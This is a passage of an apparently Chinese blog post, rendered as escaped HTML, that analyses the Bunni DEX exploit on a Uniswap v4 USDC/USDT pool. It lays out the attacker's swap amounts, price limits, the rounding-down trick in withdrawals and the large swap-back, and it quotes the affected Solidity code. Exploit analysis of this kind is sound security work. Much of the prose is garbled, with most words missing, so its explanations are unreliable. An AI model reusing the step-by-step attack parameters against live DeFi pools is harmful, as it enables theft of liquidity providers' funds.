\u003C/span>\u003Cspan style=\"color:#79B8FF\">21127509982676313354474563397\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">activeBalance0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">: \u003C/span>\u003Cspan style=\"color:#79B8FF\">1835280870463\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">activeBalance1\u003C/span>\u003Cspan style=\"color:#E1E4E8\">: \u003C/span>\u003Cspan style=\"color:#79B8FF\">1079504135618\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">shouldSurge\u003C/span>\u003Cspan style=\"color:#E1E4E8\">: \u003C/span>\u003Cspan style=\"color:#79B8FF\">false\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">updatedBalance0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">: \u003C/span>\u003Cspan style=\"color:#79B8FF\">1835309635015\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">totalLiquidityEstimate0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">: \u003C/span>\u003Cspan style=\"color:#79B8FF\">58302939913731650\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">totalLiquidityEstimate1\u003C/span>\u003Cspan style=\"color:#E1E4E8\">: \u003C/span>\u003Cspan style=\"color:#79B8FF\">58302026139899289\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">totalLiquidityEstimate0.\u003C/span>\u003Cspan style=\"color:#B392F0\">fullMulX96\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(totalDensity0X96): \u003C/span>\u003Cspan style=\"color:#79B8FF\">1835309635014\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">totalLiquidityEstimate0.\u003C/span>\u003Cspan style=\"color:#B392F0\">fullMulX96\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(totalDensity1X96): \u003C/span>\u003Cspan style=\"color:#79B8FF\">1079521054801\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">totalLiquidityEstimate1.\u003C/span>\u003Cspan style=\"color:#B392F0\">fullMulX96\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(totalDensity0X96): \u003C/span>\u003Cspan style=\"color:#79B8FF\">1835280870463\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">totalLiquidityEstimate1.\u003C/span>\u003Cspan style=\"color:#B392F0\">fullMulX96\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(totalDensity1X96): \u003C/span>\u003Cspan style=\"color:#79B8FF\">1079504135618\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Ch3 id=\"\">\u003C/h3>\n\u003Col>\n\u003Cli>\n\u003Cp>\u003Cstrong>Swap\u003C/strong>\u003C/p>\n\u003Cp> activeBalance0 \u003C/p>\n\u003Cp>exactIn/exactOut/exactin 3  swap USDC  USDT USDC/USDT  activeBalance0  26 wei\u003C/p>\n\u003C/li>\n\u003C/ol>\n\u003Cul>\n\u003Cli>swap 1 balance totalLiquidityEstimate0 &#x26; totalLiquidityEstimate1\u003C/li>\n\u003C/ul>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"javascript\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#79B8FF\">1.7088106e7\u003C/span>\u003Cspan style=\"color:#79B8FF\"> USDT\u003C/span>\u003Cspan style=\"color:#F97583\"> ->\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 2\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> wei \u003C/span>\u003Cspan style=\"color:#79B8FF\">USDC\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, exactIn\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">tick\u003C/span>\u003Cspan style=\"color:#E1E4E8\">: \u003C/span>\u003Cspan style=\"color:#F97583\">-\u003C/span>\u003Cspan style=\"color:#79B8FF\">1\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#F97583\">~\u003C/span>\u003Cspan style=\"color:#79B8FF\">0.9999\u003C/span>\u003Cspan style=\"color:#79B8FF\"> USDT\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> per \u003C/span>\u003Cspan style=\"color:#79B8FF\">USDC\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">sqrtPriceLimitX96\u003C/span>\u003Cspan style=\"color:#E1E4E8\">: \u003C/span>\u003Cspan style=\"color:#79B8FF\">79226236828369693485340663719\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (pool.slot0s.sqrtPriceX96 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 2\u003C/span>\u003Cspan style=\"color:#F97583\">**\u003C/span>\u003Cspan style=\"color:#79B8FF\">44\u003C/span>\u003Cspan style=\"color:#E1E4E8\">), tick \u003C/span>\u003Cspan style=\"color:#B392F0\">limit\u003C/span>\u003Cspan style=\"color:#E1E4E8\">: \u003C/span>\u003Cspan style=\"color:#F97583\">-\u003C/span>\u003Cspan style=\"color:#79B8FF\">1\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>swap 1 \u003C/p>\n\u003Cp>\u003Cimg __ASTRO_IMAGE_=\"{&#x22;src&#x22;:&#x22;../../assets/blog_img/2025-09-22/image-20250914011750017.png&#x22;,&#x22;alt&#x22;:&#x22;image-20250914011750017&#x22;,&#x22;index&#x22;:0}\">\u003C/p>\n\u003Cp> swap 1  sqrtPriceLimitX96 sqrtPriceX96 2**44BunniHub  swap  inputToken  outputTokenv3 inputToken  rawBalance \u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"solidity\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">BunniHub\u003C/span>\u003Cspan style=\"color:#F97583\">:\u003C/span>\u003Cspan style=\"color:#B392F0\">hookHandleSwap\u003C/span>\u003Cspan style=\"color:#E1E4E8\">()\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">// pull input claim tokens from hook\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">if\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (inputAmount \u003C/span>\u003Cspan style=\"color:#F97583\">!=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\tzeroForOne \u003C/span>\u003Cspan style=\"color:#F97583\">?\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> state.rawBalance0 \u003C/span>\u003Cspan style=\"color:#F97583\">+=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> inputAmount \u003C/span>\u003Cspan style=\"color:#F97583\">:\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> state.rawBalance1 \u003C/span>\u003Cspan style=\"color:#F97583\">+=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> inputAmount;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\tpoolManager.\u003C/span>\u003Cspan style=\"color:#B392F0\">transferFrom\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#79B8FF\">address\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(key.hooks), \u003C/span>\u003Cspan style=\"color:#79B8FF\">address\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#79B8FF\">this\u003C/span>\u003Cspan style=\"color:#E1E4E8\">), inputToken.\u003C/span>\u003Cspan style=\"color:#B392F0\">toId\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(), inputAmount);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">}\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>swap 1 1.7088106e7  2 wei USDC~0.9999 USDT per USDC inputToken  rawBalance  rawBalance1  totalLiquidityEstimate1 \u003Cstrong>totalLiquidityEstimate0  totalLiquidityEstimate1\u003C/strong> swap 2 \u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>uint256 totalLiquidityEstimate1 = balance1.fullMulDiv(Q96, totalDensity1X96);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>rawBalance1 -> balance1 -> totalLiquidityEstimate1 -> totalLiquidityEstimate1 > totalLiquidityEstimate0\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cul>\n\u003Cli>swap 2 reduce activeBalance0 to 499 wei\u003C/li>\n\u003C/ul>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"solidity\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#79B8FF\">1\u003C/span>\u003Cspan style=\"color:#E1E4E8\">.\u003C/span>\u003Cspan style=\"color:#79B8FF\">835492291952e12\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> USDT \u003C/span>\u003Cspan style=\"color:#F97583\">->\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 1\u003C/span>\u003Cspan style=\"color:#E1E4E8\">.\u003C/span>\u003Cspan style=\"color:#79B8FF\">835309634512e12\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#79B8FF\">1835309635012\u003C/span>\u003Cspan style=\"color:#F97583\"> -\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 500\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) USDC, exactOut\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">tick\u003C/span>\u003Cspan style=\"color:#F97583\">:\u003C/span>\u003Cspan style=\"color:#F97583\"> -\u003C/span>\u003Cspan style=\"color:#79B8FF\">1\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, ~\u003C/span>\u003Cspan style=\"color:#79B8FF\">0.9999\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> USDT per USDC\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">sqrtPriceLimitX96\u003C/span>\u003Cspan style=\"color:#F97583\">:\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 1461446703485210103287273052203988822378723970341\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, tick limit\u003C/span>\u003Cspan style=\"color:#F97583\">:\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 887272\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(max tickPrice)\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>swap 2 \u003C/p>\n\u003Cp>\u003Cimg __ASTRO_IMAGE_=\"{&#x22;src&#x22;:&#x22;../../assets/blog_img/2025-09-22/image-20250914014148538.png&#x22;,&#x22;alt&#x22;:&#x22;image-20250914014148538&#x22;,&#x22;index&#x22;:0}\">\u003C/p>\n\u003Cp> swap 2  exactOut  token0  activeBalance0  activeBalance0 - 500\u003C/p>\n\u003Cp> activeBalance0  499 wei\u003C/p>\n\u003Cul>\n\u003Cli> totalLiquidityEstimate0 &#x3C; totalLiquidityEstimate1  totalLiquidityEstimate0  totalLiquidity  activeBalance\u003Cstrong>\u003C/strong>swap 2  token0 \u003C/li>\n\u003C/ul>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>- fullMulX96  activeBalance0  updatedBalance0  1\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp> LDF  totalLiquidityEstimate0  swap 2  activeBalance0\u003C/p>\n\u003Cul>\n\u003Cli>swap 3 reduce activeBalance0 to 25 wei\u003C/li>\n\u003C/ul>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"javascript\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">swap \u003C/span>\u003Cspan style=\"color:#79B8FF\">3\u003C/span>\u003Cspan style=\"color:#E1E4E8\">:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#79B8FF\">1e6\u003C/span>\u003Cspan style=\"color:#79B8FF\"> USDT\u003C/span>\u003Cspan style=\"color:#F97583\"> ->\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 472\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> wei \u003C/span>\u003Cspan style=\"color:#79B8FF\">USDC\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, exactIn\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">tick\u003C/span>\u003Cspan style=\"color:#E1E4E8\">: \u003C/span>\u003Cspan style=\"color:#79B8FF\">3\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#F97583\">~\u003C/span>\u003Cspan style=\"color:#79B8FF\">1.0003\u003C/span>\u003Cspan style=\"color:#79B8FF\"> USDT\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> per \u003C/span>\u003Cspan style=\"color:#79B8FF\">USDC\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">sqrtPriceLimitX96\u003C/span>\u003Cspan style=\"color:#E1E4E8\">: \u003C/span>\u003Cspan style=\"color:#79B8FF\">101729702841318637793976746270\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, tick \u003C/span>\u003Cspan style=\"color:#B392F0\">limit\u003C/span>\u003Cspan style=\"color:#E1E4E8\">: \u003C/span>\u003Cspan style=\"color:#79B8FF\">5000\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>swap 3 \u003C/p>\n\u003Cp>\u003Cimg __ASTRO_IMAGE_=\"{&#x22;src&#x22;:&#x22;../../assets/blog_img/2025-09-22/image-20250914014220737.png&#x22;,&#x22;alt&#x22;:&#x22;image-20250914014220737&#x22;,&#x22;index&#x22;:0}\">\u003C/p>\n\u003Cp> swap 3 **1e6 USDT** USDC  activeBalanace0  25 weiswap 3 totalLiquidityEstimate1 &#x3C; totalLiquidityEstimate0 totalLiquidityEstimate1  totalLiquidity  activeBalance0\u003C/p>\n\u003Cp> swap  swap  uniswapv4 unlock  1.835510380058e12 USDT 1.835309634986e12 USDC  uniswapv4  activeBalance0  1835280870463  25 wei \u003Cstrong>Rounding Trick\u003C/strong> \u003C/p>\n\u003Cp>shouldSurge  false / slot0s.lastSurgeTimestamp  \u003Cstrong>LDF  / \u003C/strong>\u003C/p>\n\u003Col start=\"2\">\n\u003Cli>\n\u003Cp>\u003Cstrong>Withdraw\u003C/strong>\u003C/p>\n\u003Cp> withdraw shares activeBalance0  \u003Cstrong>3 wei\u003C/strong>\u003C/p>\n\u003Cp> \u003Cstrong>Rounding Down\u003C/strong>  withdraw shares  withdraw  totalDensity0  activeBalance0  idleBalance  totalLiquidity  5.8303205157163981e16  9.114083388149667e15  activeBalance0  25 wei  3 wei\u003C/p>\n\u003Cp>BunniHubLogic::withdraw  idleBalance \u003Cstrong>mulDiv\u003C/strong>  withdraw  idleBalance updatedIdleBalance0 totalLiquidity  totalLiquidityEstimate  totalLiquidity  updatedBalance0 \u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"solidity\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">Withdraw\u003C/span>\u003Cspan style=\"color:#E1E4E8\">()\u003C/span>\u003Cspan style=\"color:#F97583\">:\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> \u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#79B8FF\">uint256\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> idleBalance \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> idleBalance \u003C/span>\u003Cspan style=\"color:#F97583\">-\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> idleBalance.\u003C/span>\u003Cspan style=\"color:#B392F0\">mulDiv\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(shares, currentTotalSupply);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#79B8FF\">uint256\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> balance0 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> ( rawbalance0 \u003C/span>\u003Cspan style=\"color:#F97583\">-\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> rawbalance0.\u003C/span>\u003Cspan style=\"color:#B392F0\">mulDiv\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(shares, currentTotalSupply) ) \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> \u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">\t\t\t\t\t\t\t\t\tpreviewRedeem\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(reserve0) \u003C/span>\u003Cspan style=\"color:#F97583\">-\u003C/span>\u003Cspan style=\"color:#B392F0\"> previewRedeem\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(reserve0.\u003C/span>\u003Cspan style=\"color:#B392F0\">mulDiv\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(shares, currentTotalSupply));\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">floor\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(idleBalance \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> shares \u003C/span>\u003Cspan style=\"color:#F97583\">/\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> totalSupply) \u003C/span>\u003Cspan style=\"color:#F97583\">->\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> idleBalance \u003C/span>\u003Cspan style=\"color:#F97583\">-\u003C/span>\u003Cspan style=\"color:#B392F0\"> floor\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(idleBalance \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> shares \u003C/span>\u003Cspan style=\"color:#F97583\">/\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> totalSupply)\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>QueryLDF.sol::QueryLDF  activeBalance0  totalLiquidity\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"solidity\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">QueryLDF\u003C/span>\u003Cspan style=\"color:#E1E4E8\">()\u003C/span>\u003Cspan style=\"color:#F97583\">:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#79B8FF\">uint256\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> balance, \u003C/span>\u003Cspan style=\"color:#79B8FF\">bool\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> isToken0) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> IdleBalanceLibrary.\u003C/span>\u003Cspan style=\"color:#B392F0\">fromIdleBalance\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(idleBalance);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">balance0 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#B392F0\"> subReLU\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(balance0, balance); \u003C/span>\u003Cspan style=\"color:#6A737D\">// updatedBalance0\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">            \u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#79B8FF\">uint256\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> totalLiquidityEstimate0 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> updatedBalance0.\u003C/span>\u003Cspan style=\"color:#B392F0\">fullMulDiv\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(Q96, totalDensity0X96);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">if\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (totalLiquidityEstimate0 \u003C/span>\u003Cspan style=\"color:#F97583\">&#x3C;\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> totalLiquidityEstimate1) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">  totalLiquidity \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#B392F0\"> roundUpFullMulDivResult\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(updatedBalance0, Q96, totalDensity0X96, totalLiquidityEstimate0);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">  (activeBalance0, activeBalance1) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    FixedPointMathLib.\u003C/span>\u003Cspan style=\"color:#B392F0\">min\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(balance0, totalLiquidityEstimate0.\u003C/span>\u003Cspan style=\"color:#B392F0\">fullMulX96\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(totalDensity0X96)),\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">  \tFixedPointMathLib.\u003C/span>\u003Cspan style=\"color:#B392F0\">min\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(balance1, totalLiquidityEstimate0.\u003C/span>\u003Cspan style=\"color:#B392F0\">fullMulX96\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(totalDensity1X96))\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">  );\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">} \u003C/span>\u003Cspan style=\"color:#F97583\">else\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">  totalLiquidity \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#B392F0\"> roundUpFullMulDivResult\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(updatedBalance1, Q96, totalDensity1X96, totalLiquidityEstimate1);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">  (activeBalance0, activeBalance1) \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">   FixedPointMathLib.\u003C/span>\u003Cspan style=\"color:#B392F0\">min\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(balance0, totalLiquidityEstimate1.\u003C/span>\u003Cspan style=\"color:#B392F0\">fullMulX96\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(totalDensity0X96)),\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">   FixedPointMathLib.\u003C/span>\u003Cspan style=\"color:#B392F0\">min\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(balance1, totalLiquidityEstimate1.\u003C/span>\u003Cspan style=\"color:#B392F0\">fullMulX96\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(totalDensity1X96))\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">  );\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">}\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp> withdraw shares  activeBalance0  25 wei  3 wei totalLiquidity  5.8303205157163981e16  0.9114083388149667e16\u003C/p>\n\u003Cp> withdrawal \u003C/p>\n\u003Cp>\u003Cimg __ASTRO_IMAGE_=\"{&#x22;src&#x22;:&#x22;../../assets/blog_img/2025-09-22/image-20250914020525202.png&#x22;,&#x22;alt&#x22;:&#x22;image-20250914020525202&#x22;,&#x22;index&#x22;:0}\">\u003C/p>\n\u003Cp> withdrawal  withdraw shares  3.31262636100e11 idleBalance \u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>floor(3.16691975216e11 * 3.31262636100e11 / 1596.285784192335992906e18) = floor(65.72) = 65\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp> idleBalance  previewRedeem  delta previewRedeem(rawBalance0)  1 wei withdrawal 12 ~ 13 balance0  idleBalance  65 wei withdrawal 13 ~ 14balance0  idleBalance 1 wei 1 wei  QueryLDF  balance0 updatedBalance0 activeBalance0  1 wei withdrawal activeBalance0  3 wei\u003C/p>\n\u003Cp>44 withdrawal \u003C/p>\n\u003Cp>\u003Cimg __ASTRO_IMAGE_=\"{&#x22;src&#x22;:&#x22;../../assets/blog_img/2025-09-22/image-20250913123917118.png&#x22;,&#x22;alt&#x22;:&#x22;image-20250913123917118&#x22;,&#x22;index&#x22;:0}\">\u003C/p>\n\u003Cp>1.4363547901296e13 lp  activeBalance0  totalLiquidity \u003C/p>\n\u003C/li>\n\u003Cli>\n\u003Cp>\u003Cstrong>SwapBack\u003C/strong>\u003C/p>\n\u003Cp>\u003Cstrong>\u003C/strong> USDC\u003C/p>\n\u003Cp> swap  1  swap  USDT  USDC  tick839189 2.78e36 USDT/USDC   2  swap  1  swap  USDT  USDC  uniswapv4  \u003Cstrong>Flash Accounting\u003C/strong>  token  token  takesync  settle  swap 4  uniswap v4  USDT  swap  uniswap v3  swap  token transfer\u003C/p>\n\u003Cul>\n\u003Cli>\n\u003Cp>swap 4 swap giant amount of USDT to USDC\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>swap 4:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>1e19 USDT -> 1 wei USDC, exactIn\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>tick: 5000, ~1.6487 USDT per USDC\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>sqrtPriceLimitX96: 1461446703485210103287273052203988822378723970341, tick limit: 887272 (TickMath.MAX_TICK)\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>swap 4 \u003C/p>\n\u003Cp>\u003Cimg __ASTRO_IMAGE_=\"{&#x22;src&#x22;:&#x22;../../assets/blog_img/2025-09-22/image-20250914020135697.png&#x22;,&#x22;alt&#x22;:&#x22;image-20250914020135697&#x22;,&#x22;index&#x22;:0}\">\u003C/p>\n\u003Cp> swap 4  1e19  USDT  USDC LDF  CarpetedDoubleGeometricDistribution 12 carpet  tick  twap  swap \u003C/p>\n\u003Cp>swap 4  USDT  USDC tick  839189 2.78e36 USDT/USDCbalance0  idleBalance  activeBalance0 \u003C/p>\n\u003C/li>\n\u003Cli>\n\u003Cp>swap 5\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>swap 5:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>5.03177409646e11 USDC -> 1.0000002885864344623e19 USDT, exactOut\u003C/span>\u003C/span>\n\u003Cspan 